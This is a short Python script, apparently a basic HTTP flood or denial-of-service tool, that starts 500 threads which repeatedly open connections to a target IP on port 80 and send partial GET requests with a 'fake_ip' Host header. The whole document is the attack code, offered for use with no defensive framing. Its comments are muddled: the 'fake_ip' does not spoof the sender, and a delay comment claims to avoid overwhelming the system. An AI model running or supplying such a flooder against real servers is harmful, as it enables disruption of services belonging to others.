import threading
import socket
import time

target = '192.168.100.1'
port = 80
fake_ip = "192.172.63.3"

def attack():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        except socket.error:
            print("Socket error occurred")
        time.sleep(0.1)  # Adding a delay to avoid overwhelming the system

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()